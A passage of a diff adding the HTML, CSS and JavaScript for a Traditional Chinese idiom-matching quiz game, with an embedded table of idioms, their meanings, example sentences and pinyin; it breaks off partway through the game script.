@@ -1,0 +1,1606 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🥷烏衣行成語</title>
+	<link rel="stylesheet" href="https://oikasu1.github.io/fonts/twfonts.css">
+	<script src="dict.js"></script>
+    <style>
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+			user-select: none;
+        }
+        .container {
+            background-color: white;
+	  	    justify-content: center;
+		    align-items: center;
+            padding: 30px 20px 20px 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 800px;
+            width: 100%;
+        }
+        .setup, .game {
+            display: none;
+        }
+        .active {
+            display: block;
+        }
+        select, button {
+            margin: 10px;
+            padding: 5px 10px;
+        }
+        .item-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .left-item, .right-item {
+            margin: 5px;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+			border: 2px solid #fff;			
+        }
+
+        .left-item:hover, .right-item:hover {
+            background-color: #c0f0c0;
+        }
+
+        .left-item {
+			background-color: #f3f3f3;
+			font-family: BpmfZihiSans-Regular;	
+			font-size: 1.3em;
+        }
+
+        .right-item {
+			background-color: #eaeaea;
+        }
+
+        .selected {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        .selected:hover {
+            background-color: #299920;
+            color: white;
+        }
+
+        .selected-wrong {
+            background-color: #CC5550;
+            color: white;
+        }
+
+        .selected-wrong:hover {
+            background-color: #CC5550;
+            color: white;
+        }
+
+		.left-item.correct, .right-item.correct {
+			background-color: #fff !important;
+			color: #1B5E20;
+			border: 2px solid #AACC88;
+		}
+
+        #start-button, #view-idioms-button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+		#next-button-container {
+			display: flex;
+			justify-content: space-between;
+			margin-top: 10px;
+		}
+		#next-button, #end-button {
+			width: calc(50% - 5px);
+			height: 40px;
+			padding: 10px;
+			background-color: #4CAF50;
+			color: white;
+			border: none;
+			border-radius: 5px;
+			cursor: pointer;
+			visibility: hidden;
+			opacity: 0;
+			transition: opacity 0.3s ease;
+		}
+
+		#next-button.visible, #end-button.visible {
+			visibility: visible;
+			opacity: 1;
+		}
+
+
+
+		#return-to-setup {
+			display: block;
+			margin-top: 20px;
+			padding: 10px 20px;
+			background-color: #4CAF50;
+			color: white;
+			border: none;
+			border-radius: 5px;
+			cursor: pointer;
+		}
+        .progress-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .close-button {
+            margin-right: 40px;
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        .progress-bar {
+            flex-grow: 1;
+            height: 20px;
+            background-color: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .progress {
+            height: 100%;
+            background-color: orange;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        .round-info {
+            margin-left: 10px;
+            font-weight: bold;
+        }
+        #character {
+		font-size: 1.5em;
+            transition: transform 0.3s ease;
+        }
+        #character.animated {
+            transform: scale(1.5);
+        }
+
+		.result {
+			display: none;
+	  	    justify-content: center;
+		    align-items: center;
+			margin: 20px auto;
+			max-width: 400px;
+			padding: 20px;
+			border-radius: 10px;
+
+		}
+
+		.result h2 {
+			text-align: center;
+			margin-bottom: 20px;
+			color: #333;
+		}
+
+		.result p {
+			margin: 10px 0;
+			font-size: 16px;
+			color: #555;
+		}
+
+		.accuracy-container {
+		 text-align: center;
+		}
+
+		.accuracy-bar {
+			flex-grow: 1;
+			height: 20px;
+			background-color: #e0e0e0;
+			border-radius: 10px;
+			margin-left: 10px;
+			overflow: hidden;
+		}
+
+		#accuracy-progress {
+			height: 100%;
+			background-color: orange;
+			width: 0%;
+			transition: width 0.5s ease-in-out;
+		}
+
+		#return-to-setup {
+			display: block;
+			width: 100%;
+			margin-top: 20px;
+			padding: 10px;
+			background-color: #4CAF50;
+			color: white;
+			border: none;
+			border-radius: 5px;
+			cursor: pointer;
+			font-size: 16px;
+			transition: background-color 0.3s;
+		}
+
+		#return-to-setup:hover {
+			background-color: #45a049;
+		}
+
+		@media (max-width: 768px) {
+			.right-item {
+				margin-top: 10px;
+				margin-bottom: 10px;
+			}
+		}
+
+		@media (max-width: 768px) {
+			.game {
+				height: 90vh;
+				overflow-y: auto;
+				scrollbar-width: none;
+				-ms-overflow-style: none;
+			}
+
+			.game::-webkit-scrollbar {
+				display: none;
+			}
+		}
+
+		@media (max-width: 768px) {
+			.item-container {
+				flex-direction: column;
+				align-items: stretch;
+			}
+
+			#leftContainer {
+				flex-direction: row;
+				flex-wrap: wrap;
+				justify-content: space-between;
+			}
+
+			#leftContainer .left-item {
+				width: calc(50% - 10px);
+				box-sizing: border-box;\				
+			}
+
+			#rightContainer .right-item {
+				width: calc(100% - 30px);
+				margin-bottom: 10px;
+			}
+
+			#next-button-container {
+				flex-direction: row;
+			}
+
+			#next-button, #end-button {
+				width: calc(50% - 5px);
+			}
+
+
+		}
+
+		.sound-button {
+
+			margin: 0px 5px;
+			cursor: pointer;
+			font-size: 20px;
+		}
+
+.idiom-list {
+    background-color: white;
+    padding: 10px 20px;
+    border-radius: 10px;
+    width: calc(100% - 40px);
+    margin: 0 auto;
+	height: 70vh;
+    position: relative;
+}
+
+.idiom-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 20px;
+    position: relative;
+}
+
+.idiom-header h2 {
+    margin: 0;
+    flex-grow: 1;
+    text-align: center;
+}
+
+.idiom-header .close-button {
+    position: absolute;
+    right: 0;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    font-size: 1.5em;
+    cursor: pointer;
+    padding: 0;
+}
+
+.list-close-button {
+    background: none;
+    border: none;
+    font-size: 1.2em;
+    cursor: pointer;
+    padding: 0;
+}
+
+/* 確保其他關閉按鈕不受影響 */
+.close-button:not(#close-idiom-list) {
+    position: static;
+    transform: none;
+}
+
+
+
+
+
+.close-button {
+    background: none;
+    border: none;
+    font-size: 1.5em;
+    cursor: pointer;
+    color: #333;
+}
+
+.idiom-controls {
+    margin-bottom: 10px;
+}
+
+.idiom-controls label {
+    margin-right: 10px;
+}
+
+
+
+
+.idiom-table-container {
+    overflow-x: auto;
+    max-height: calc(80vh - 130px);
+}
+
+#idiom-table {
+    width: 100%;
+    border-collapse: collapse;
+}
+
+#idiom-table thead {
+    position: sticky;
+    top: 0;
+	padding: 20px;
+    background-color: #f2f2f2;
+    z-index: 1;
+}
+
+#idiom-table th  {
+    border: 1px solid #ddd;
+    padding: 10px;
+    text-align: center;
+}
+
+#idiom-table td {
+    border: 1px solid #ddd;
+    padding: 5px 5px 5px 10px;
+    text-align: left;
+}
+
+
+
+.small-number{
+    color: #ff5555;
+	font-size: 0.4em;
+}
+
+.idiom {
+    min-width: 130px;
+	font-size: 1.1em;
+	font-family: BpmfZihiSans-Regular;
+}
+
+
+
+
+#idiom-table th {
+    background-color: #e1e1e1;
+}
+
+#idiom-table tbody tr:nth-child(odd) {
+    background-color: #f8f8f8;
+}
+
+#idiom-table tbody tr:nth-child(even) {
+    background-color: #fefefe;
+}
+
+@media (max-width: 768px) {
+    .idiom-list {
+        padding: 10px;
+        max-height: 90vh;
+    }
+
+    .idiom-controls {
+        display: flex;
+        flex-wrap: wrap;
+    }
+
+    .idiom-controls label {
+        margin-bottom: 10px;
+    }
+
+    #idiom-table {
+        font-size: 14px;
+    }
+    
+    #idiom-table th, #idiom-table td {
+        padding: 5px;
+    }
+}
+
+.nav-button {
+    padding: 5px 10px;
+    background-color: #4CAF50;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.nav-button:hover {
+    background-color: #45a049;
+}
+
+.nav-button:disabled {
+    background-color: #cccccc;
+    cursor: not-allowed;
+}
+.font-toggle-button {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    border: 1px solid #4CAF50;
+    background-color: white;
+    color: #4CAF50;
+    font-size: 12px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    cursor: pointer;
+    margin-right: 5px;
+}
+
+#clear-records {
+    background-color: #f44336;
+    color: white;
+    border: none;
+    padding: 5px 10px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 12px;
+    margin: 10px 5px 0 5px;
+    cursor: pointer;
+    border-radius: 50px;
+    transition: background-color 0.3s;
+}
+
+#clear-records:hover {
+    background-color: #d32f2f;
+}
+
+#clear-records:active {
+    background-color: #b71c1c;
+}
+
+#clear-records:disabled {
+    background-color: #cccccc;
+    color: #666666;
+    cursor: not-allowed;
+}
+
+.sorting-area {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin: 20px 0;
+}
+
+.answer-area {
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    min-height: 65px;
+    border-bottom: 2px solid #eee;
+    width: 90%;
+    padding: 10px;
+    margin-bottom: 10px;
+}
+
+
+.character-options {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin-bottom: 10px;
+}
+
+.character-option, .in-answer {
+    font-size: 1.5em;
+    margin: 5px;
+    padding: 8px;
+    background-color: #f0f0f0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+.check-button {
+    margin-top: 10px;
+    padding: 10px 20px;
+    background-color: #4CAF50;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 1em;
+}
+
+.check-button:disabled {
+	visibility: hidden;
+}
+
+.idiom-question {
+    margin-bottom: 0px;
+}
+
+
+.character-option:hover, .in-answer:hover {
+    background-color: #e0e0e0;
+}
+
+
+
+.in-answer {
+    font-size: 1.5em;
+    margin: 5px;
+    padding: 10px;
+    background-color: #e0f0e0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    cursor: pointer;
+    display: inline-block;
+}
+
+        @keyframes jumpAnimation {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        @keyframes shakeAnimation {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-3px); }
+            75% { transform: translateX(3px); }
+        }
+
+        .jump {
+            animation: jumpAnimation 0.3s ease;
+        }
+
+        .shake {
+            animation: shakeAnimation 0.3s ease;
+        }
+
+
+    </style>
+</head>
+<body>
+    <div class="container">
+		<div class="setup active" id="setup">
+			<h1 id="myTitle">🥷烏衣行成語</h1>
+			<div>
+				<label for="category-select">分類：</label>
+				<select id="category-select">
+					<option value="all">所有分類</option>
+					<!-- 其他分類選項將在這裡動態生成 -->
+				</select>
+			</div>
+			<div>
+				<label for="match-type-select">配對：</label>
+				<select id="match-type-select">
+					<option value="成語-表達意思">成語 - 表達意思</option>
+					<option value="成語-字面意思">成語 - 字面意思</option>
+					<option value="成語-例句">成語 - 例句</option>
+					<option value="成語-排序">成語 - 排序</option>
+				</select>
+			</div>
+			<div>
+				<label for="order-select">順序：</label>
+				<select id="order-select">
+					<option value="random">隨機</option>
+					<option value="sequential">依序</option>
+				</select>
+			</div>			
+			<button id="view-idioms-button">檢視成語 🔎</button>
+			<button id="start-button">開始遊戲 🚀</button>
+		</div>
+
+		<div class="game" id="game">
+			<div class="progress-container">
+				<div class="close-button" id="close-button">✖︎</div>				
+				<div class="progress-bar">
+					<div class="progress" id="progress"></div>
+				</div>
+				<div class="round-info" id="round-info"></div>
+				<div class="sound-button" id="sound-button">🔔</div>
+				<div class="font-toggle-button" id="font-toggle-button">字</div>
+			</div>
+			<h1><span id="character">🙂</span></h1>
+			<div id="left-right-container">
+				<div class="item-container" id="leftContainer"></div>
+				<div class="item-container" id="rightContainer"></div>
+			</div>
+			<div id="sorting-container" style="display: none;">
+				<div class="idiom-question" id="idiom-question"></div>
+				<div class="sorting-area">
+					<div id="answer-area" class="answer-area"></div>
+					<div id="character-options" class="character-options"></div>
+				</div>
+				<button id="check-answer" class="check-button">確定</button>
+			</div>
+			<div id="next-button-container">                
+				<button id="end-button">🎉 結束</button>
+				<button id="next-button">下一題 🚀</button>
+			</div>
+		</div>
+
+		<div class="idiom-list" id="idiom-list" style="display: none;">
+			<div class="idiom-header">
+			<button id="close-idiom-list" class="list-close-button">✖︎</button><button id="prev-category" class="nav-button">上一分類</button>
+				<h2>🥷成語</h2>
+				
+				<button id="next-category" class="nav-button">下一分類</button><div class="font-toggle-button" id="list-font-toggle-button">字</div>
+			</div>
+
+			<div class="idiom-controls">
+				<label><input type="checkbox" id="show-category" checked>分類</label>
+				<label><input type="checkbox" id="show-idiom" checked>成語</label>
+				<label><input type="checkbox" id="show-literal" checked>字面</label>
+				<label><input type="checkbox" id="show-figurative" checked>用意</label>
+				<label><input type="checkbox" id="show-example">例句</label>
+			</div>
+			<div class="idiom-table-container">
+				<table id="idiom-table">
+					<thead>
+						<tr>
+							<th class="category">分類</th>
+							<th class="idiom">成語</th>
+							<th class="literal">字面意思</th>
+							<th class="figurative">表達意思</th>
+							<th class="example">例句</th>
+						</tr>
+					</thead>
+					<tbody>
+						<!-- 成語資料將在這裡動態生成 -->
+					</tbody>
+				</table>
+			</div>
+		</div>
+
+		<div id="result" class="result">
+			<h2>🥷烏衣行成語</h2>
+		
+				<div class="accuracy-bar">
+					<div id="accuracy-progress"></div>
+				</div>
+
+			<div class="accuracy-container">		
+				<p id="accuracy"></p>
+				<p id="time-spent"></p>
+				<p id="total-rounds"></p>
+				<p id="total-pairs"></p>
+				<p id="selected-category"></p>
+				<p id="match-type-result"></p>
+				<p id="order-type-result"></p>
+			</div>
+			<button id="clear-records" disabled>清除紀錄 🗑️</button>
+			<button id="return-to-setup">返回 🛸</button>
+		</div>
+
+    </div>
+
+    <script>
+        const idiomsData = `
+分類	成語	字面意思	表達意思	例句	拼音
+A01	耳提面命	在耳邊提醒，面前叮囑，悉心教誨。	耐心指導，親自教誨。	老師對我們耳提面命，提醒我們細節。|老師對他耳提面命，反覆叮囑。	er3 ti2 mian4 ming4
+A01	借花獻佛	借他人之物，向佛獻禮，比喻借物送人。	拿他人東西做人情。	這束花是借花獻佛，送給您的。|他用朋友的點子借花獻佛。	jie4 hua1 xian4 fo2
+A01	精衛填海	精衛鳥填海不懈，比喻意志堅強。	決心堅定，不畏艱難。	他每天努力學習，真有精衛填海的精神。|小美為夢想精衛填海，不畏艱難。	jing1 wei4 tian2 hai3
+A01	良藥苦口	好藥雖苦，卻能治病，比喻忠言逆耳。	忠言多半不中聽。	他的建議雖然刺耳，但良藥苦口。|他的批評雖然刺耳，但良藥苦口。	liang2 yao4 ku3 kou3
+A01	天翻地覆	天地顛倒，比喻變化劇烈。	變化巨大，完全不同。	經過改革，公司的面貌天翻地覆。|科技進步讓生活天翻地覆。	tian1 fan1 di4 fu4
+A01	打退堂鼓	在退堂時敲鼓，比喻中途退縮。	中途退縮，不再堅持。	遇到困難就想打退堂鼓，怎麼行呢？|遇到困難，他差點打退堂鼓。	da3 tui4 tang2 gu3
+A01	翻山越嶺	越過山嶺，比喻歷經艱難。	克服困難，努力前進。	他翻山越嶺，終於找到那位老師。|他們翻山越嶺，只為看日出。	fan1 shan1 yue4 ling3
+A01	披星戴月	頂星星，帶月亮，比喻連夜奔波。	早出晚歸，勤奮勞作。	他每天披星戴月，為了家人努力工作。|爸爸每天披星戴月地工作。	pi1 xing1 dai4 yue4
+A02	懸崖勒馬	到了懸崖，勒住馬，即時停止。	及時回頭，避免危險。	他在錯誤邊緣懸崖勒馬，及時回頭。|在最危險的時候，他懸崖勒馬。	xuan2 ya2 le4 ma3
+A02	兢兢業業	小心謹慎，認真負責。	小心謹慎，認真負責。	他兢兢業業地完成每一項工作。|他對工作總是兢兢業業。	jing1 jing1 ye4 ye4
+A02	雞犬不寧	連雞犬也不得安寧，比喻騷亂不安。	混亂不安，無法安靜。	最近的工程讓鄰居們雞犬不寧。|小孩鬧騰得家裡雞犬不寧。	ji1 quan3 bu4 ning2
+A02	一視同仁	同樣看待他人，不分厚薄。	不分厚薄，平等對待。	老師對所有學生一視同仁，不偏不倚。|老師對每位學生一視同仁。	yi1 shi4 tong2 ren2
+A02	孤注一擲	投入全部賭注，比喻孤勇冒險。	冒險一搏，不留退路。	他將全部資金孤注一擲，投資這項計畫。|他為了成功孤注一擲。	gu1 zhu4 yi1 zhi4
+A02	盡善盡美	一切完美無缺，極致完美。	完美無瑕，無可挑剔。	他把這次作品做到盡善盡美。|他追求把作品做得盡善盡美。	jin4 shan4 jin4 mei3
+A02	秀外慧中	外表秀麗，內心智慧。	外表秀麗，內心聰慧。	她不僅漂亮，還秀外慧中。|她不僅漂亮，更是秀外慧中。	xiu4 wai4 hui4 zhong1
+A02	豁然開朗	豁然明朗，比喻忽然明白。	心境頓悟，茅塞頓開。	他聽完建議後，心中豁然開朗。|經過指點，他頓時豁然開朗。	huo4 ran2 kai1 lang3
+A02	登峰造極	登上高峰，比喻達到極致。	達到最高境界。	他的藝術成就已經登峰造極。|他的技術已達登峰造極的境界。	deng1 feng1 zao4 ji2
+A02	虛懷若谷	胸懷如谷地般寬闊，比喻謙虛。	謙虛謹慎，虛心學習。	他待人虛懷若谷，十分謙虛。|他為人謙遜，虛懷若谷。	xu1 huai2 ruo4 gu3
+A02	不同凡響	聲音不同常人，比喻卓越出眾。	出眾非凡，與眾不同。	她的演講真是不同凡響，打動人心。|她的表演確實不同凡響。	bu4 tong2 fan2 xiang3
+A02	千變萬化	千萬種變化，形容變化多端。	變化多端，無法預測。	天空的雲層千變萬化，美不勝收。|時尚的流行風格千變萬化。	qian1 bian4 wan4 hua4
+A02	不知不覺	無自覺地發生或發現。	無意間，不知不覺中。	不知不覺中，時間已經過去一整天。|聊著聊著，不知不覺天亮了。	bu4 zhi1 bu4 jue2
+A02	不知所措	不知如何應對，形容慌張。	驚慌失措，無法應對。	聽到這消息，他一時不知所措。|突如其來的變故讓他不知所措。	bu4 zhi1 suo3 cuo4
+`;
+
+
+
+const dictMap = new Map(dictData.trim().split('\n').map(line => {
+    const [pinyin, chars] = line.split('\t');
+	const charsSplit = Array.from(chars);
+    return [pinyin, charsSplit];
+}));
+
+function getPinyinArray(pinyinString) {
+    return pinyinString.split(/ +/);
+}
+
+function getRandomCharForPinyin(pinyin, excludeChars) {
+    const chars = dictMap.get(pinyin) || [];
+    const availableChars = chars.filter(char => !excludeChars.includes(char));
+    return availableChars[Math.floor(Math.random() * availableChars.length)];
+}
+
+
+function removeBPMCharacters(str) {
+    return str.replace(/[󠇠󠇡󠇢󠇣󠇤󠇥󠇦󠇧󠇨󠇩]/gu, '');
+}
+
+const idioms = idiomsData.trim().split('\n').slice(1).map(line => {
+    const [分類, 成語, 字面意思, 表達意思, 例句, 拼音] = line.split('\t');
+    const idiomNoBPM = removeBPMCharacters(成語);
+    return { 分類, 成語, idiomNoBPM, 字面意思, 表達意思, 例句, 拼音 };
+});
+
+        const categories = [...new Set(idioms.map(idiom => idiom.分類))];
+        const categorySelect = document.getElementById('category-select');
+        categories.forEach(category => {
+            const option = document.createElement('option');
+            option.value = category;
+            option.textContent = category;
+            categorySelect.appendChild(option);
+        });
+
+let currentIdioms = [];
+let selectedLeft = null;
+let selectedRight = null;
+let matchType = '成語-表達意思';
+// const matchType = document.getElementById('match-type-select').value;
+let currentIndex = 0;
+let orderedIdioms = [];
+let totalRounds = 0;
+let currentRound = 0;
+const idiomsPerRound = 4;
+let startTime;
+let correctPairs = 0;
+let totalPairs = 0;
+let isSoundOn = true;
+let currentCategoryIndex = 0;
+let currentFont = 'BpmfZihiSans-Regular';
+let currentFontState = 'zih';
+let currentFontSize = '1.3em';
+const idiomLocalName = "j01";
+
+const happyEmojis = "🥰😛🤗😄😍🤩😘😚😋😊😆😁😄😃";
+const sadEmojis = "😟😮🥺😧😨😥😢😭😱😖😩😤";
+
+const rightAudio = new Audio('right.mp3');
+const wrongAudio = new Audio('wrong.mp3');
+
+function playAudio(audio) {
+    if (isSoundOn) {
+        audio.currentTime = 0;
+        audio.play();
+    }
+}
+
+// 從 localStorage 讀取錯誤記錄
+function getErrorRecords() {
+    const records = localStorage.getItem(`${idiomLocalName}_errorRecords`);
+    return records ? JSON.parse(records) : {};
+}
+
+// 保存錯誤記錄到 localStorage
+function saveErrorRecords(records) {
+    localStorage.setItem(`${idiomLocalName}_errorRecords`, JSON.stringify(records));
+}
+
+// 更新錯誤記錄
+function updateErrorRecord(idiom) {
+    const records = getErrorRecords();
+    records[idiom] = (records[idiom] || 0) + 1;
+    saveErrorRecords(records);
+}
+
+// 清除錯誤記錄
+function clearErrorRecords() {
+    localStorage.removeItem(`${idiomLocalName}_errorRecords`);
+}
+
+document.getElementById('sound-button').onclick = toggleSound;
+
+function toggleFont() {
+    const fontToggleButton = document.getElementById('font-toggle-button');
+	const ListfontToggleButton = document.getElementById('list-font-toggle-button');
+
+    const leftItems = document.querySelectorAll('.left-item');
+	const idioms = document.querySelectorAll('.idiom');
+
+    switch(currentFontState) {
+        case 'zih':
+            currentFontState = 'box';
+            fontToggleButton.textContent = '框';
+			ListfontToggleButton.textContent = '框';
+			currentFont = 'BpmfZihiBox-R';
+			currentFontSize = '1.4em';
+
+			leftItems.forEach(item => {
+				item.style.fontFamily = 'BpmfZihiBox-R';
+				item.style.fontSize = '1.4em';
+			});
+			idioms.forEach(item => {
+				item.style.fontFamily = 'BpmfZihiBox-R';
+				item.style.fontSize = '1.4em';
+				item.style.minWidth = '160px';
+			});
+            break;
+        case 'box':
+            currentFontState = 'bpmf';
+            fontToggleButton.textContent = '音';
+			ListfontToggleButton.textContent = '音';
+			currentFont = 'BpmfZihiOnly-R';
+			currentFontSize = '2em';
+
+			leftItems.forEach(item => {
+				item.style.fontFamily = 'BpmfZihiOnly-R';
+				item.style.fontSize = '2em';
+			}); 
+			idioms.forEach(item => {
+				item.style.fontFamily = 'BpmfZihiOnly-R';
+				item.style.fontSize = '1.6em';
+				item.style.minWidth = '120px';
+			}); 
+            break;
+        case 'bpmf':
+            currentFontState = 'zih';
+            fontToggleButton.textContent = '字';
+			ListfontToggleButton.textContent = '字';
+			currentFont = 'BpmfZihiSans-Regular';
+			currentFontSize = '1.3em';
+
+			leftItems.forEach(item => {
+				item.style.fontFamily = 'BpmfZihiSans-Regular';
+				item.style.fontSize = '1.3em';
+			}); 
+			idioms.forEach(item => {
+				item.style.fontFamily = 'BpmfZihiSans-Regular';
+				item.style.fontSize = '1em';
+				item.style.minWidth = '120px';
+
+			}); 
+            break;
+    }
+}
+
+function toggleSound() {
+    isSoundOn = !isSoundOn;
+    const soundButton = document.getElementById('sound-button');
+    soundButton.textContent = isSoundOn ? '🔔' : '🔕';
+}
+
+function showEndButton() {
+    const endButton = document.getElementById('end-button');
+    endButton.classList.add('visible');
+}
+
+function hideEndButton() {
+    const endButton = document.getElementById('end-button');
+	endButton.blur();
+    endButton.classList.remove('visible');
+}
+
+function shuffleArray(array) {
+    for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+    }
+}
+
+        function selectItem(item, side) {
+            if (side === 'left') {
+                if (selectedLeft) {
+                    selectedLeft.classList.remove('selected');
+                }
+                selectedLeft = item;
+            } else {
+                if (selectedRight) {
+                    selectedRight.classList.remove('selected');
+                }
+                selectedRight = item;
+            }
+            item.classList.add('selected');
+
+            if (selectedLeft && selectedRight) {
+                checkMatch();
+            }
+        }
+
+	function stringToArray(str) {
+		return Array.from(str.match(/\P{RI}\p{RI}?\p{RI}?/gu) ?? []);
+	}
+
+	function getRandomEmoji(emojiString) {
+		const emojiArray = stringToArray(emojiString);
+		return emojiArray[Math.floor(Math.random() * emojiArray.length)];
+	}
+
+	function changeEmoji(isCorrect) {
+		const character = document.getElementById('character');
+		if (isCorrect) {
+			character.textContent = getRandomEmoji(happyEmojis);
+			character.classList.add('animated');
+
+			/*
+			setTimeout(() => {
+				character.textContent = '🙂';
+				character.classList.remove('animated');
+			}, 2000);
+			*/
+		} else {
+			character.textContent = getRandomEmoji(sadEmojis);
+			character.classList.add('animated');
+		}
+	}
+
+
+
+    function checkMatch() {
+        const leftText = selectedLeft.textContent;
+        const rightText = selectedRight.textContent;
+        const correctPair = currentIdioms.find(pair => pair.left === leftText && pair.right === rightText);
+		const leftItems = document.querySelectorAll('.left-item');
+		const nextButton = document.getElementById('next-button');
+		const endButton = document.getElementById('end-button');
+
+        if (correctPair) {
+			correctPairs++;
+			playAudio(rightAudio);
+            
+            
+			selectedLeft.classList.add('jump');
+			setTimeout(() => {
+				selectedLeft.classList.remove('jump');
+				selectedLeft.style.backgroundColor = '#4CAF50';				
+			}, 500);
+
+			selectedRight.classList.add('jump');
+			setTimeout(() => {
+				selectedRight.classList.remove('jump');
+				selectedRight.style.backgroundColor = '#4CAF50';				
+			}, 500);
+
+            selectedLeft.style.pointerEvents = 'none';
+            selectedRight.style.pointerEvents = 'none';
+			selectedLeft.classList.add('correct');
+			selectedRight.classList.add('correct');
+            selectedLeft = null;
+            selectedRight = null;
+            changeEmoji(true);
+
+            if (document.querySelectorAll('.left-item:not([style*="pointer-events: none"])').length === 0) {
+    			leftItems.forEach(item => {
+					item.style.fontFamily = 'BpmfZihiSans-Regular';
+					item.style.fontSize = '1.3em';
+				});  
+				if(currentRound >= totalRounds){
+					showEndButton();
+					endButton.focus();									
+				} else {
+					showNextButton();
+					showEndButton();
+					nextButton.focus();
+				}
+            }
+        } else {
+			playAudio(wrongAudio);
+			changeEmoji(false);
+			updateErrorRecord(selectedLeft.textContent);
+
+
+
+			selectedLeft.classList.add('shake');
+			selectedLeft.classList.add('selected-wrong');
+			selectedLeft.classList.remove('selected');
+			setTimeout(() => {
+				selectedLeft.classList.remove('shake');	
+				selectedLeft.classList.remove('selected-wrong');
+				selectedLeft = null;
+			}, 500);
+
+			selectedRight.classList.add('shake');
+			selectedRight.classList.add('selected-wrong');
+			selectedRight.classList.remove('selected');
+			setTimeout(() => {
+				selectedRight.classList.remove('shake');	
+				selectedRight.classList.remove('selected-wrong');
+				selectedRight = null;
+			}, 500);
+		}
+		totalPairs++;
+    }
+
+
+
+function showResult() {
+    const endTime = new Date();
+    const timeSpent = Math.round((endTime - startTime) / 1000);
+    const accuracy = Math.round((correctPairs / totalPairs) * 100);
+
+    document.getElementById('accuracy-progress').style.width = `${accuracy}%`;
+
+    document.getElementById('accuracy').textContent = `✨正確：${accuracy}%`;
+    document.getElementById('total-rounds').textContent = `🎡回合：${currentRound}`;
+    document.getElementById('time-spent').textContent = `⏰努力：${timeSpent} 秒`;
+    document.getElementById('selected-category').textContent = `📒分類：${categorySelect.options[categorySelect.selectedIndex].text}`;
+    document.getElementById('match-type-result').textContent = `🪧配對：${document.getElementById('match-type-select').options[document.getElementById('match-type-select').selectedIndex].text}`;
+    
+    const orderSelect = document.getElementById('order-select');
+    const orderText = orderSelect.options[orderSelect.selectedIndex].text;
+    document.getElementById('order-type-result').textContent = `🏷️順序：${orderText}`;
+
+    updateClearRecordsButton();
+
+    document.getElementById('game').style.display = 'none';
+    document.getElementById('result').style.display = 'block';
+}
+
+document.getElementById('end-button').onclick = function() {
+    showResult();
+};
+
+document.getElementById('return-to-setup').onclick = function() {
+    document.getElementById('result').style.display = 'none';
+	initializeCategories();
+	resetGame();	
+};
+
+        function showNextButton() {
+            const nextButton = document.getElementById('next-button');		
+            nextButton.classList.add('visible');
+        }
+
+        function hideNextButton() {
+            const nextButton = document.getElementById('next-button');
+			nextButton.blur();
+            nextButton.classList.remove('visible');
+        }
+
+function getOrderedIdioms() {
+    const selectedCategory = categorySelect.value;
+    let filteredIdioms;
+
+    if (selectedCategory === '常錯挑戰') {
+        const errorRecords = getErrorRecords();
+        filteredIdioms = idioms.filter(idiom => errorRecords.hasOwnProperty(idiom.成語));
+        
+        if (document.getElementById('order-select').value === 'sequential') {
+            filteredIdioms.sort((a, b) => errorRecords[b.成語] - errorRecords[a.成語]);
+        }
+    } else {
+        filteredIdioms = selectedCategory === 'all' ? 
+            idioms.slice() : idioms.filter(idiom => idiom.分類 === selectedCategory);
+    }
+
+    return filteredIdioms;
+}
+
+
+function updateProgress() {
+    const progress = document.getElementById('progress');
+    const roundInfo = document.getElementById('round-info');
+    progress.style.width = `${(currentRound / totalRounds) * 100}%`;
+    roundInfo.textContent = `${currentRound}/${totalRounds}`;
+}
+
+function resetGame() {
+    currentIndex = 0;
+    currentRound = 0;
+    orderedIdioms = [];
+    correctPairs = 0;
+    totalPairs = 0;
+    hideEndButton();
+    hideNextButton();
+    document.getElementById('setup').classList.add('active');
+    document.getElementById('setup').style.display = 'block';
+    document.getElementById('game').classList.remove('active');
+    document.getElementById('game').style.display = 'none';
+	
+}
+
+function getRandomExample(examples) {
+    const exampleArray = examples.split('|');
+    return exampleArray[Math.floor(Math.random() * exampleArray.length)].trim();
+}
+
+// 出題;
+
+function startNewRound() {
+    const selectedCategory = categorySelect.value;
+    const orderType = document.getElementById('order-select').value;
+
+    const nextButton = document.getElementById('next-button');
+    const endButton = document.getElementById('end-button');
+    nextButton.blur();
+    endButton.blur();
+
+    if (currentIndex === 0 || currentIndex >= orderedIdioms.length) {
+        orderedIdioms = getOrderedIdioms();
+        if (orderType === 'random' || (selectedCategory === '常錯挑戰' && orderType === 'sequential')) {
+            shuffleArray(orderedIdioms);
+        }
+        currentIndex = 0;
+        // 根據遊戲模式設置 totalRounds
+        if (matchType === '成語-排序') {
